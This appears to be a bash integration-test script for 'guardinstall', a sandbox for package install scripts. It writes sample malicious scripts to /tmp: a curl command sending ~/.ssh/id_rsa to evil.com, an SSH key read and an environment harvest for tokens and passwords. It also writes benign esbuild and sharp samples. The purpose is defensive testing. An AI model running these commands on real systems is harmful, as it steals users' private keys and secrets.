#!/bin/bash
# Comprehensive integration tests for guardinstall
# Tests both malicious and legitimate package patterns

echo "=== guardinstall Integration Tests ==="
echo ""

# Test 1: Malicious - curl exfiltration
echo "Test 1: Malicious curl exfiltration"
cat > /tmp/test-mal-curl.sh << 'EOF'
#!/bin/bash
echo "Exfiltrating data..."
curl -s http://evil.com/steal --data "$(cat ~/.ssh/id_rsa 2>/dev/null || echo 'no ssh key')"
EOF
chmod +x /tmp/test-mal-curl.sh

# Test 2: Malicious - read SSH key
echo "Test 2: Malicious SSH key read"
cat > /tmp/test-mal-ssh.sh << 'EOF'
#!/bin/bash
echo "Reading SSH key..."
cat ~/.ssh/id_rsa 2>/dev/null || echo "No SSH key found"
EOF
chmod +x /tmp/test-mal-ssh.sh

# Test 3: Malicious - environment variable harvest
echo "Test 3: Malicious env var harvest"
cat > /tmp/test-mal-env.sh << 'EOF'
#!/bin/bash
echo "Harvesting environment variables..."
env | grep -i "key\|token\|secret\|password" || echo "No sensitive env vars found"
EOF
chmod +x /tmp/test-mal-env.sh

# Test 4: Legitimate - esbuild (downloads binary from npm)
echo "Test 4: Legitimate package - esbuild pattern"
cat > /tmp/test-legit-esbuild.sh << 'EOF'
#!/bin/bash
echo "Downloading esbuild binary (legitimate)..."
curl -s https://registry.npmjs.org -o /dev/null && echo "Download succeeded" || echo "Download failed"
EOF
chmod +x /tmp/test-legit-esbuild.sh

# Test 5: Legitimate - sharp (native module)
echo "Test 5: Legitimate package - sharp pattern"
cat > /tmp/test-legit-sharp.sh << 'EOF'
#!/bin/bash
echo "Running sharp install script..."
node -e "console.log('Sharp: checking dependencies...')" || echo "Sharp check failed"
EOF
chmod +x /tmp/test-legit-sharp.sh

echo ""
echo "=== Setup complete ==="
echo "Test scripts created in /tmp/"
echo ""
echo "To test malicious scripts (should be BLOCKED):"
echo "  /home/mahi/app/guardinstall/packages/sandbox/target/release/sandboxer /tmp/test-mal-curl.sh test-curl"
echo "  /home/mahi/app/guardinstall/packages/sandbox/target/release/sandboxer /tmp/test-mal-ssh.sh test-ssh"
echo "  /home/mahi/app/guardinstall/packages/sandbox/target/release/sandboxer /tmp/test-mal-env.sh test-env"
echo ""
echo "To test legitimate scripts (should be ALLOWED with --no-seccomp):"
echo "  /home/mahi/app/guardinstall/packages/sandbox/target/release/sandboxer /tmp/test-legit-esbuild.sh esbuild --no-seccomp"
echo "  /home/mahi/app/guardinstall/packages/sandbox/target/release/sandboxer /tmp/test-legit-sharp.sh sharp --no-seccomp"
